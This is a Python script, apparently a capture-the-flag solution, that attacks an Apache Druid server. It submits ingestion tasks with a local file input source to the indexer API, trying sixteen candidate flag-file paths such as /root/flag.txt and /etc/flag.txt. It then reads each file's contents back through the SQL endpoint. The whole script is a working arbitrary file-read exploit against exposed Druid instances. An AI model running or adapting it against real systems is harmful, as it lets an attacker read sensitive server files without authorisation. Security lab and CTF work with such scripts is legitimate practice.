import json
import time
import urllib.request
import urllib.error
import sys

target = 'http://192.168.5.6'
ports = '8081'
base_url = f'{target}:{ports}'
paths = [
    '/flag.txt',
    '/root/flag.txt',
    '/home/flag.txt',
    '/home/ctf/flag.txt',
    '/app/flag.txt',
    '/flag/flag.txt',
    '/opt/flag.txt',
    '/opt/druid/flag.txt',
    '/tmp/flag.txt',
    '/var/flag.txt',
    '/var/www/flag.txt',
    '/usr/local/flag.txt',
    '/usr/local/share/flag.txt',
    '/etc/flag.txt',
    '/data/flag.txt',
    '/druid/flag.txt'
]

def post_json(url, data):
    req = urllib.request.Request(url, data=json.dumps(data).encode(), headers={'Content-Type': 'application/json'}, method='POST')
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read().decode())

def get_json(url):
    req = urllib.request.Request(url, method='GET')
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read().decode())

def get_text(url):
    req = urllib.request.Request(url, method='GET')
    with urllib.request.urlopen(req, timeout=30) as resp:
        return resp.read().decode(errors='ignore')

for idx, path in enumerate(paths):
    datasource = f'flag_guess_{idx}'
    spec = {
        "type": "index_parallel",
        "spec": {
            "dataSchema": {
                "dataSource": datasource,
                "timestampSpec": {
                    "column": "timestamp",
                    "missingValue": "1970-01-01T00:00:00.000Z"
                },
                "dimensionsSpec": {
                    "dimensions": ["line"]
                },
                "granularitySpec": {
                    "segmentGranularity": "DAY",
                    "queryGranularity": "NONE",
                    "rollup": False
                }
            },
            "ioConfig": {
                "type": "index_parallel",
                "inputSource": {
                    "type": "local",
                    "files": [path]
                },
                "inputFormat": {
                    "type": "regex",
                    "pattern": "(.*)",
                    "columns": ["line"],
                    "listDelimiter": None
                }
            },
            "tuningConfig": {
                "type": "index_parallel",
                "maxNumConcurrentSubTasks": 1
            }
        }
    }
    print(f"[*] Trying {path}")
    try:
        resp = post_json(f'{base_url}/druid/indexer/v1/task', spec)
    except urllib.error.HTTPError as err:
        body = err.read().decode(errors='ignore')
        print(f"[!] HTTP error creating task for {path}: {err.code} {body}")
        continue
    except Exception as e:
        print(f"[!] Exception creating task for {path}: {e}")
        continue

    task_id = resp.get('task')
    if not task_id:
        print(f"[!] No task ID returned for {path}: {resp}")
        continue

    print(f"[+] Created task {task_id} for {path}")
    status = None
    for attempt in range(60):
        try:
            stat = get_json(f'{base_url}/druid/indexer/v1/task/{task_id}/status')
            status = stat.get('status', {}).get('status')
            print(f"  status {status}")
        except Exception as e:
            print(f"  [!] Could not fetch status: {e}")
            status = None
        if status and status not in ('RUNNING', 'WAITING'):
            break
        time.sleep(2)
    if not status or status != 'SUCCESS':
        print(f"[!] Task {task_id} ended with status {status}")
    log = get_text(f'{base_url}/druid/indexer/v1/task/{task_id}/log')
    processed = 0
    for line in log.splitlines():
        if 'Processed[' in line:
            try:
                inner = line.split('Processed[')[1]
                num = inner.split(']')[0]
                processed = int(num)
            except Exception:
                continue
    print(f"  Processed rows: {processed}")
    if processed <= 0:
        continue
    print(f"[+] Data found at {path} (datasource {datasource})")
    query = {"query": f"SELECT line FROM {datasource} LIMIT 20"}
    sql_resp = post_json(f'{target}:8888/druid/v2/sql', query)
    print("SQL query result:")
    print(json.dumps(sql_resp, indent=2))
    sys.exit(0)
print("[-] No flag found in candidate paths")
PY
